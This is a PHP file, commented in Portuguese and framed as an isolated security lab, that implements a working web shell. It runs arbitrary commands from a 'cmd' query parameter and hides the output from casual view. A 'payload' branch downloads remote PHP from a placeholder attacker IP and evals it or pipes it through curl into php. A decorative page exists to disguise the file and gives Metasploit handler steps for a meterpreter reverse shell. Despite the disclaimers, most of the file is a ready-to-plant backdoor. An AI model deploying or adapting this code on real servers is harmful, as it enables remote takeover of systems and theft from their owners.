<?php
/**
 * vulnerable.php
 * 
 * Página PHP vulnerável intencionalmente para fins de estudo/lab
 * Demonstra RCE (Remote Code Execution) via parâmetro 'cmd'
 * 
 * USO APENAS EM AMBIENTE CONTROLADO E ISOLADO
 * 
 * AVISO: NUNCA suba isso em servidor real ou acessível publicamente
 */

error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

$debug = isset($_GET['debug']);

// ================================================
// PARTE VULNERÁVEL - RCE via parâmetro 'cmd'
// ================================================
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Métodos comuns de execução (ordem de preferência)
    $output = '';
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $out);
        $output = implode("\n", $out);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    }
    
    if ($debug) {
        echo "<pre>Comando executado: " . htmlspecialchars($cmd) . "\n\n";
        echo "Saída:\n" . htmlspecialchars($output) . "</pre>";
    } else {
        // Esconde saída para não chamar atenção
        header('Content-Type: text/plain');
        echo "OK";
    }
    exit;
}

// ================================================
// Payload de teste (exemplo de reverse shell PHP stageless)
// Rode o handler ANTES de acessar com ?payload=1
// ================================================
if (isset($_GET['payload'])) {
    // ATENÇÃO: cole aqui o conteúdo gerado por msfvenom -f raw
    // Exemplo placeholder - substitua pelo real!
    $payload_url = 'http://SEU_IP_LOCAL:8000/meter.php'; // MUDE PARA O SEU IP
    
    $content = @file_get_contents($payload_url);
    if ($content && strlen($content) > 100) {
        eval('?>' . $content);
    } else {
        // Fallback se file_get_contents falhar
        @system("curl -s '$payload_url' | php 2>/dev/null");
    }
    
    if ($debug) {
        echo "<pre>Tentou carregar payload de: $payload_url</pre>";
    } else {
        echo "<!-- payload attempt -->";
    }
    exit;
}

// ================================================
// Conteúdo normal da página (para disfarçar)
// ================================================
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site de Demonstração</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 2rem; }
        pre { background: #111; padding: 1rem; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <h1>Site de Demonstração - Lab de Segurança</h1>
    <p>Esta página é usada apenas para fins educacionais em ambiente isolado.</p>
    
    <h2>Como usar este lab (apenas localmente!)</h2>
    <pre>
1. Rode o handler no msfconsole:
   use multi/handler
   set payload php/meterpreter_reverse_https
   set LHOST seu.ip.local
   set LPORT 443
   exploit -j

2. Hospede o payload gerado:
   python3 -m http.server 8000

3. Acesse esta página com parâmetros:
   ?cmd=whoami              → executa comando
   ?cmd=ipconfig            → (Windows)
   ?payload=1               → tenta carregar reverse shell
   ?debug=1                 → mostra saída (para debug)
    </pre>

    <p style="color: #f44; font-weight: bold;">
        NUNCA exponha este arquivo em servidor real ou internet.
    </p>
</body>
</html>
